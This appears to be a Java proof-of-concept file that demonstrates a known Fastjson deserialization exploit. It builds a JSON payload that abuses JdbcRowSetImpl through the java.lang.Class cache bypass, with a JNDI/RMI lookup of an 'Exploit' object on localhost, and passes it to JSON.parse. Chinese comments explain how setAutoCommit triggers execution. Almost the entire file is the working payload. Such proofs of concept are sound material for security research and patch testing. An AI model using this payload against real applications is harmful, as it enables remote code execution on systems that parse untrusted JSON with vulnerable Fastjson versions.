package com.xianyue.leakbug.fastjson;

import com.alibaba.fastjson.JSON;

/**
 * @author liuhongjun
 * @since 2019-07-16
 */
public class ParseClient {

    public static void main(String[] argv) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        // @type 该JSON应当还原成何种类型的对象, val: 将JdbcRowSetImpl序列化为Class类
        // Exploit 对应的结构体则为JdbcRowSetImpl的属性， 在调用setAutoCommit方法时，产生了执行漏洞
        String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
            "\"Exploit\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":" +
            "\"rmi://localhost:1098/Exploit\",\"autoCommit\":true}}}";

        JSON.parse(payload);
    }

}
